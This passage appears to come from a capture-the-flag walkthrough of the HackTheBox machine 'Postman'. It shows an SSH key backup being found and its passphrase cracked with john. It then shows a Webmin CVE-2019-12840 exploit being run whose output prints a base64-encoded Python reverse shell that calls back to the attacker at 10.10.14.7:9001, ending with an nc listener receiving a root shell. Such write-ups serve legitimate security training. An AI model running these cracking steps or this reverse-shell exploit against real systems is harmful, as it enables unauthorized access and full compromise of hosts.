Enumerating the victim machine we found Matt ssh private key

```bash
[>] find / -type f -name *.bak -exec ls -l {} \; 2>/dev/null 
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
```

But we need a passphrase. Lets try to crack it with ssh2john

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ ssh2john id_rsa.bak > matt_id_rsa_cracked

┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ john matt_id_rsa_cracked -w=/usr/share/wordlists/rockyou.txt 
[...SNIP...]
computer2008     (id_rsa.bak)    
```

And we got the credentials Matt:computer2008 . Trying to ssh with the key doesn't work but changing user from redis to Matt works perfectly

```bash
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ whoami
Matt
```

Trying the matt credentials in https://postman:10000/ works, so now we can execute the exploits we found at the enumeration phase

![[Pasted image 20231116214727.png]]

As I don't want to use metasploit (is not allowed in the OSCP exam) y open the **[exploit](https://www.exploit-db.com/exploits/46984)** copy the CVE code (CVE-2019-12840) and then I search the exploit by CVE in google. So we will use **[this exploit](https://github.com/KrE80r/webmin_cve-2019-12840_poc/blob/master/CVE-2019-12840.py)**

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Postman-10.10.10.160]
└─$ python3 CVE-2019-12840.py -U Matt -P computer2008 -u https://postman -p 10000 -lhost 10.10.14.7 -lport 9001

[...SNIP...]

[*] logging in ...
[+] got sid 51d7ff947d37435bed6251f03e22b174
[*] sending command python -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjciLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p'))" 

-------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.160] 55346
/bin/sh: 0: cant access tty; job control turned off
# whoami
root
```

And we are root